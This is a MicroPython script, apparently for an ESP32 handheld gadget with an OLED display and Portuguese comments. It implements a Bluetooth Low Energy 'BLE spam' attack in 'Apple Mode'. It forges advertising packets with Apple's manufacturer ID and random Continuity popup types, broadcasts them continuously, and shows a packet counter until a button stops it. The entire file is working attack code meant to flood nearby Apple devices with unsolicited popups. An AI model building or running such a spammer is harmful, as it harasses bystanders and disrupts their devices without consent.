import ubluetooth
import urandom
import time
import struct

def _gerar_payload_apple():
    # Tipos de popup do Continuity Protocol
    tipos = [0x07, 0x09, 0x0F, 0x10, 0x0B]
    tipo = urandom.choice(tipos)
    
    payload = struct.pack("BB", 0x4C, 0x00)  # Apple manufacturer ID
    payload += struct.pack("B", tipo)         # tipo de popup
    
    # Dados aleatórios para variar o popup
    for _ in range(urandom.randint(3, 8)):
        payload += struct.pack("B", urandom.randint(0, 255))
    
    return payload

def _montar_advertising(payload):
    # Estrutura: [tamanho][tipo 0xFF][payload]
    return struct.pack("BB", len(payload) + 1, 0xFF) + payload

def executar_ble_spam(oled, btn_select):
    ble = ubluetooth.BLE()
    ble.active(True)

    # Aguarda botao ser solto antes de comecar
    while btn_select.value() == 0:
        time.sleep(0.05)
    time.sleep(0.2)

    contador = 0

    while True:
        if btn_select.value() == 0:
            while btn_select.value() == 0:
                time.sleep(0.05)
            time.sleep(0.2)
            break

        payload = _gerar_payload_apple()
        adv_data = _montar_advertising(payload)

        try:
            ble.gap_advertise(100, adv_data)
        except:
            pass

        contador += 1

        oled.fill(0)
        oled.text("BLE SPAM", 30, 0)
        oled.hline(0, 10, 128, 1)
        oled.text("Apple Mode", 25, 20)
        oled.text("Pacotes:", 10, 36)
        oled.text(str(contador), 90, 36)
        oled.text("[select] parar", 4, 54)
        oled.show()

        time.sleep(0.3)

    ble.gap_advertise(None)
    ble.active(False)